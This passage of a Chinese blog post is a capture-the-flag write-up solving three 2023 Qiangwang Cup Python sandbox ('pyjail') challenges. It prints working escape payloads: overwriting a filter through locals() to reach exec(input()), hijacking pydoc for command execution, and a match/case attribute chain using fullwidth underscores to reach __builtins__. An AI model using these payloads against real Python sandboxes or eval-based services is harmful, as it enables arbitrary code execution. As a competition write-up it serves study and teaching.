class="hljs-string">&#x27;tem(&quot;whoami&quot;)&#x27;</span>)&#125;<span class="hljs-string">&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
+<p><code>pydoc.py</code> 写入完毕之后，再次运行题目代码，只需要输入 <code>&#123;help()&#125;</code> 即可执行设定好的代码：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/qwb2023-pyjail/789b1a88-1ce4-4d76-837f-a98949114560.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>至此，我们实现了 RCE。至于 <code>pydoc.py</code> 内容怎么写，玩法就很多了，这里不展开了。</p>
+<h3 id="思路-3利用循环覆盖函数">思路 3：利用循环+覆盖函数</h3>
+<p>如果 <code>open</code> 也无法使用呢？</p>
+<p>由于题目中使用了 <code>while</code>，因此 eval 生成的值又会被赋给 input_code 重新参与 eval，那如果我们在第一轮循环中只要操作得当，就可以用一行输入来影响第二轮循环中 while 的判断，同时把最终 exp 传递给第二轮循环的 eval。</p>
+<ol type="1">
+<li><code>"&#123;" in input_code and "&#125;" in input_code</code></li>
+<li><code>input_code.isascii()</code></li>
+<li><code>my_filter(input_code)</code></li>
+<li><code>"eval" not in input_code</code></li>
+<li><code>len(input_code) &lt; 650</code></li>
+</ol>
+<p>我们先来分析一下：</p>
+<ul>
+<li>条件 1、2、4 都是无能为力的，因为 input_code 作为内建类型，魔术方法（<code>.__contains__</code>）由于是由 Python 解释器在底层实现的，因此是不允许修改的。</li>
+<li>条件 3、5 我们可以动手脚，<code>my_filter</code>、<code>len</code> 都可以覆盖，需要一个参数，并且返回值必须为 True</li>
+</ul>
+<p>所以，在第一轮的 exp 里我们需要把 <code>globals()</code> 清空，然后再把 <code>my_filter</code> 加上，最后利用题目中的 eval 来返回第二轮的 exp。那么问题来了，第二轮的 exp 应该是什么呢？</p>
+<p>在第二轮的时候，经过第一轮的 eval，就只需要满足条件 1、2、4 即可，并且由于我们清空了 <code>globals()</code>，导致内置函数都恢复了，可谓是一箭双雕。这样我们就可以用 <code>exec(input())</code> 来执行任意代码了。</p>
+<p>由于第一轮 eval 必须返回字符串（主要是条件 2 的限制），所以我们可以用一个列表之类的东西来同时执行代码和返回需要的 exp（这个技巧其实之前也介绍过了）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">  (</span><br><span class="hljs-string">  &quot;&#123;exec(input())&#125;&quot;,</span><br><span class="hljs-string">  globals().clear(),</span><br><span class="hljs-string">  globals().update(&#123;&quot;my_filter&quot;: id&#125;)</span><br><span class="hljs-string">  )[0]</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>&#123;(<span class="hljs-string">&quot;&#123;ex&quot;</span><span class="hljs-string">&quot;ec(in&quot;</span><span class="hljs-string">&quot;put())&#125;&quot;</span>,<span class="hljs-built_in">globals</span>().clear(),<span class="hljs-built_in">globals</span>().update(&#123;<span class="hljs-string">&quot;my_filter&quot;</span>:<span class="hljs-built_in">id</span>&#125;))[<span class="hljs-number">0</span>]&#125;<br></code></pre></td></tr></table></figure>
+<p>蛮吊蛮吊，但是长度太长了，81 个字符，距离 64 个字符还有点距离，因此我们尝试来缩短长度。</p>
+<ul>
+<li>首先 <code>globals()</code> 与 <code>locals()</code> 在这里是等价的，但后者少一个字符，换！</li>
+<li>其次 <code>"&#123;ex""ec(in""put())&#125;"</code> 可以换成 <code>&#123;"&#123;break""point()&#125;"&#125;</code></li>
+<li>只要返回字符串，不一定就得用列表或者元组，用条件表达式也可以，比如 <code>or</code></li>
+</ul>
+<p>于是可以得到一个长度为 74、73 的 exp：<br />
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">  locals().clear() or </span><br><span class="hljs-string">  locals().update(&#123;&quot;my_filter&quot;: id&#125;) or </span><br><span class="hljs-string">  &quot;&#123;break&quot;&quot;point()&#125;&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment"># len == 74</span><br>&#123;<span class="hljs-built_in">locals</span>().clear()<span class="hljs-keyword">or</span> <span class="hljs-built_in">locals</span>().update(&#123;<span class="hljs-string">&quot;my_filter&quot;</span>:<span class="hljs-built_in">id</span>&#125;)<span class="hljs-keyword">or</span><span class="hljs-string">&quot;&#123;break&quot;</span><span class="hljs-string">&quot;point()&#125;&quot;</span>&#125;<br><br><span class="hljs-comment"># len == 73</span><br>&#123;<span class="hljs-string">&quot;,break&quot;</span><span class="hljs-string">&quot;point()#&#123;&#125;&quot;</span>,<span class="hljs-built_in">locals</span>().clear(),<span class="hljs-built_in">locals</span>().update(&#123;<span class="hljs-string">&quot;my_filter&quot;</span>:<span class="hljs-built_in">id</span>&#125;)&#125;<br></code></pre></td></tr></table></figure></p>
+<p>感觉这个长度已经是极限了。然后我突然意识到，出题人为了避免自身代码受到影响，并没有劫持所有高危的内置函数，比如 <code>eval</code>，所以我又搞了个符合长度要求但是不满足条件的 exp：<code>&#123;["&#123;ev""al(print(1))&#125;",locals().update(&#123;"my_filter":id&#125;)][0]&#125;</code>，因为第二轮 exp 中会出现 <code>eval</code>，而出题人在 <code>while</code> 里特别关照了 <code>eval</code>。那么还有哪些内置函数，出题人没有为了保障题目自身不出问题而没有劫持呢？答案就是 <code>input()</code>。</p>
+<p>在第二轮里我们可以通过 input 来引入额外的输入，输入的时候再引入 <code>&#123;&#125;</code>，从而通过内层的 f-string 以及配合外层的 eval 进行代码执行。这样第二轮执行的原型为：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/qwb2023-pyjail/d6f10e98-c8b2-49e5-b635-0163e8ce3091.png!blog#width-zoom6" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>继续倒推回去第一轮，由于 input 没有被劫持，所以连 <code>locals().clear()</code> 也可以省略，因此 exp 长度就可以大幅缩减：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">  (</span><br><span class="hljs-string">    &quot;&#123;input()&#125;&quot;,</span><br><span class="hljs-string">    locals().update(&#123;&quot;my_filter&quot;: id&#125;)</span><br><span class="hljs-string">  )[0]</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>&#123;<span class="hljs-built_in">locals</span>().update(&#123;<span class="hljs-string">&quot;my_filter&quot;</span>:<span class="hljs-built_in">id</span>&#125;)<span class="hljs-keyword">or</span><span class="hljs-string">&quot;&#123;in&quot;</span><span class="hljs-string">&quot;put()&#125;&quot;</span>&#125;<br></code></pre></td></tr></table></figure>
+<p>长度仅为 50！蛮吊蛮吊。</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/qwb2023-pyjail/e3a19f7e-9ee7-4c62-b53f-8cded5937633.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>至此，我们不用写文件，也可以实现任意命令执行。</p>
+<h2 id="pyjail-its-myrevenge">Pyjail: It's myRevenge !!!</h2>
+<p>肉眼扫了下，好像和原来的没啥大区别。经过 diff 发现，作者修复了缺少逗号的问题：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/qwb2023-pyjail/2e911047-ee46-4c5f-9e97-782fdb524dec.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>但别的都没变。所以我猜测出题人这里可能对 flag 的位置做了调整，从环境变量中移动到其他未知文件名的文件去了。那这里还是要 rce 嘛，上面已经实现了，哈哈哈，所以这里就不再看了。</p>
+<h2 id="pyjail-its-myast">Pyjail: It's myAST !!!!</h2>
+<p>题目代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ast<br><br>BAD_ATS = &#123;<br>    ast.Attribute,<br>    ast.Subscript,<br>    ast.comprehension,<br>    ast.Delete,<br>    ast.Try,<br>    ast.For,<br>    ast.ExceptHandler,<br>    ast.With,<br>    ast.Import,<br>    ast.ImportFrom,<br>    ast.Assign,<br>    ast.AnnAssign,<br>    ast.Constant,<br>    ast.ClassDef,<br>    ast.AsyncFunctionDef,<br>&#125;<br><br>BUILTINS = &#123;<br>    <span class="hljs-string">&quot;bool&quot;</span>: <span class="hljs-built_in">bool</span>,<br>    <span class="hljs-string">&quot;set&quot;</span>: <span class="hljs-built_in">set</span>,<br>    <span class="hljs-string">&quot;tuple&quot;</span>: <span class="hljs-built_in">tuple</span>,<br>    <span class="hljs-string">&quot;round&quot;</span>: <span class="hljs-built_in">round</span>,<br>    <span class="hljs-string">&quot;map&quot;</span>: <span class="hljs-built_in">map</span>,<br>    <span class="hljs-string">&quot;len&quot;</span>: <span class="hljs-built_in">len</span>,<br>    <span class="hljs-string">&quot;bytes&quot;</span>: <span class="hljs-built_in">bytes</span>,<br>    <span class="hljs-string">&quot;dict&quot;</span>: <span class="hljs-built_in">dict</span>,<br>    <span class="hljs-string">&quot;str&quot;</span>: <span class="hljs-built_in">str</span>,<br>    <span class="hljs-string">&quot;all&quot;</span>: <span class="hljs-built_in">all</span>,<br>    <span class="hljs-string">&quot;range&quot;</span>: <span class="hljs-built_in">range</span>,<br>    <span class="hljs-string">&quot;enumerate&quot;</span>: <span class="hljs-built_in">enumerate</span>,<br>    <span class="hljs-string">&quot;int&quot;</span>: <span class="hljs-built_in">int</span>,<br>    <span class="hljs-string">&quot;zip&quot;</span>: <span class="hljs-built_in">zip</span>,<br>    <span class="hljs-string">&quot;filter&quot;</span>: <span class="hljs-built_in">filter</span>,<br>    <span class="hljs-string">&quot;list&quot;</span>: <span class="hljs-built_in">list</span>,<br>    <span class="hljs-string">&quot;max&quot;</span>: <span class="hljs-built_in">max</span>,<br>    <span class="hljs-string">&quot;float&quot;</span>: <span class="hljs-built_in">float</span>,<br>    <span class="hljs-string">&quot;divmod&quot;</span>: <span class="hljs-built_in">divmod</span>,<br>    <span class="hljs-string">&quot;unicode&quot;</span>: <span class="hljs-built_in">str</span>,<br>    <span class="hljs-string">&quot;min&quot;</span>: <span class="hljs-built_in">min</span>,<br>    <span class="hljs-string">&quot;range&quot;</span>: <span class="hljs-built_in">range</span>,<br>    <span class="hljs-string">&quot;sum&quot;</span>: <span class="hljs-built_in">sum</span>,<br>    <span class="hljs-string">&quot;abs&quot;</span>: <span class="hljs-built_in">abs</span>,<br>    <span class="hljs-string">&quot;sorted&quot;</span>: <span class="hljs-built_in">sorted</span>,<br>    <span class="hljs-string">&quot;repr&quot;</span>: <span class="hljs-built_in">repr</span>,<br>    <span class="hljs-string">&quot;object&quot;</span>: <span class="hljs-built_in">object</span>,<br>    <span class="hljs-string">&quot;isinstance&quot;</span>: <span class="hljs-built_in">isinstance</span>,<br>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_safe</span>(<span class="hljs-params">code</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(code) <span class="hljs-keyword">is</span> <span class="hljs-built_in">str</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;__&quot;</span> <span class="hljs-keyword">in</span> code:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> ast.walk(<span class="hljs-built_in">compile</span>(code, <span class="hljs-string">&quot;&lt;QWB7th&gt;&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>, flags=ast.PyCF_ONLY_AST)):<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(x) <span class="hljs-keyword">in</span> BAD_ATS:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    user_input = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        line = <span class="hljs-built_in">input</span>()<br>        <span class="hljs-keyword">if</span> line == <span class="hljs-string">&quot;&quot;</span>:<br>            <span class="hljs-keyword">break</span><br>        user_input += line<br>        user_input += <span class="hljs-string">&quot;\n&quot;</span><br><br>    <span class="hljs-keyword">if</span> is_safe(user_input) <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(user_input) &lt; <span class="hljs-number">1800</span>:<br>        <span class="hljs-built_in">exec</span>(user_input, &#123;<span class="hljs-string">&quot;__builtins__&quot;</span>: BUILTINS&#125;, &#123;&#125;)<br></code></pre></td></tr></table></figure>
+<p>老规矩先分析下限制：</p>
+<ol type="1">
+<li><code>"__"</code> 不能出现在代码里</li>
+<li>通过 ast 检查代码的抽象语法树，黑名单位于 <code>BAD_ATS</code></li>
+<li>通过指定 <code>exec</code> 的第二个参数，将代码执行的 <code>globals()</code> 重置为只有个 <code>__builtins__</code>，并将具体的内置方法指定为 <code>BUILTINS</code> 的值</li>
+</ol>
+<p>第一个条件有绕过的可能性，用 Unicode 字符 <code>_＿</code>。第二个条件是无法正面绕过的，因为 ast 本身就是 python 执行过程中的中间产物，只能说看看有没有出题人没覆盖到的 ast 节点然后再利用；第三个条件，如果可以访问到非当前模块的命名空间，就可以拿到正常的内置方法了，但是必须的获取属性，或者用 Subscript 之类做替代，但这都被禁用了。。。</p>
+<p>所以常规的沙箱逃逸 exp 可以说是都被堵死了。</p>
+<p>翻阅了下官方文档：https://docs.python.org/zh-cn/3/library/ast.html</p>
+<p>看起来除了 match 相关的语法之外，没有其他能用的东西了。但是这个是在 py3.10 中引入的，我不确定大家做题的时候出题人是否有提示所用的 python 版本，我这没有环境尝试所以也判断不了，这里权当出题人是这么出的吧。</p>
+<p>根据 pep 里的示例 https://peps.python.org/pep-0636/#abstract</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/qwb2023-pyjail/94d641e7-299f-46e5-859c-2cef201d848c.png!blog#width-zoom8" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>可以得知两个关键的知识点：</p>
+<ol type="1">
+<li>可以通过指定关键字参数来获取 match 的属性</li>
+<li>匹配的逻辑是判断 match 是否为 case 的子类</li>
+</ol>
+<p>通过知识点 1，就可以获取参数了！比如 <code>object.__subclasses__</code> 就可以通过</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">match</span> <span class="hljs-built_in">object</span>:<br>    <span class="hljs-keyword">case</span> <span class="hljs-built_in">object</span>(__subclasses__=a):<br>        <span class="hljs-built_in">print</span>(a)<br></code></pre></td></tr></table></figure>
+<p>来获取。以此类推，那这题就变成了常规的沙箱逃逸了。由于出题人限制了代码长度，因此我们可以用 dibber 来找一个比较短的继承链，比如：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/qwb2023-pyjail/6d61960d-8cff-426f-98b1-8984a57e08a4.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/qwb2023-pyjail/5fb164b7-a981-4dcd-a552-cc9872fa40b9.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>那么对于 exp <code>object._＿subclasses＿_()[122].append._＿globals＿_['_＿builtins＿_']</code> 就可以变形为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># object._＿subclasses＿_()[122].append._＿globals＿_[&#x27;_＿builtins＿_&#x27;]</span><br><span class="hljs-keyword">match</span> <span class="hljs-built_in">object</span>:<br>    <span class="hljs-keyword">case</span> <span class="hljs-built_in">object</span>(_＿subclasses＿_=a):<br>        <span class="hljs-comment"># a: object._＿subclasses＿_</span><br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">match</span> a():<br>    <span class="hljs-keyword">case</span> <span class="hljs-built_in">list</span>(pop=p):<br>        <span class="hljs-comment"># p: object._＿subclasses＿_().pop</span><br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">match</span> p(<span class="hljs-built_in">int</span>( <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>([[]]))+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">dict</span>(oooooooooooooo=())))) )):<br>    <span class="hljs-keyword">case</span> <span class="hljs-built_in">object</span>(append=m):<br>        <span class="hljs-comment"># m: object._＿subclasses＿_()[122].append</span><br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">match</span> m:<br>    <span class="hljs-keyword">case</span> <span class="hljs-built_in">object</span>(_＿<span class="hljs-built_in">globals</span>＿_=g):<br>        <span class="hljs-comment"># m: object._＿subclasses＿_()[122].append._＿globals＿_</span><br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">match</span> g:<br>    <span class="hljs-keyword">case</span> <span class="hljs-built_in">object</span>(_＿getitem＿_=p):<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">match</span> p(<span class="hljs-built_in">max</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(_＿builtins＿_=())))):<br>    <span class="hljs-keyword">case</span> <span class="hljs-built_in">object</span>(_＿getitem＿_=q):<br>        <span class="hljs-comment"># 本质上执行的是 exec(input())</span><br>        q(<span class="hljs-built_in">max</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(<span class="hljs-built_in">exec</span>=()))))(q(<span class="hljs-built_in">max</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(<span class="hljs-built_in">input</span>=()))))(), p(<span class="hljs-built_in">max</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(_＿builtins＿_=()))))) <br></code></pre></td></tr></table></figure>
+<p>进而实现命令执行：<br />
+<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/qwb2023-pyjail/d2f8c513-949b-4262-b648-5d9a1a7faf14.png!blog#width-zoom6" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>完结撒花。这三道题的整体难度不算很高。</p>
+<br>
+<p style="text-align: center;">
+<font size="2px" color="gray">这应该是今年最后一篇文章了</br>时间过得真快！</br>提前祝橘友们元旦快乐了嗷</br></font><br />
+<img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload style="zoom:30%" />
+</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="category-chain-item">经验总结</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/" class="category-chain-item">过程记录</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/">#CTF</a>
+      
+        <a href="/tags/Python/">#Python</a>
+      
+        <a href="/tags/Web/">#Web</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2023 强网杯三道 pyjail 的题解</div>
+      <div>https://www.tr0y.wang/2023/12/22/qwb2023-pyjail/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Tr0y</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年12月22日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2024年4月12日</div>
+        </div>
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/01/31/ukxq&amp;tc/" title="腾讯云加密 HLS">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">腾讯云加密 HLS</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/12/14/%E3%80%8A%E6%95%B0%E5%AD%97%E9%93%B6%E8%A1%8C%E5%AE%89%E5%85%A8%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E3%80%8B/" title="诸位看官请留步，一本好书已经登场">
+                        <span class="hidden-mobile">诸位看官请留步，一本好书已经登场</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'Macr0phag3/Macr0phag3.github.io');
+      s.setAttribute('issue-term', 'title');
+      
+      s.setAttribute('label', 'comment');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":true,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
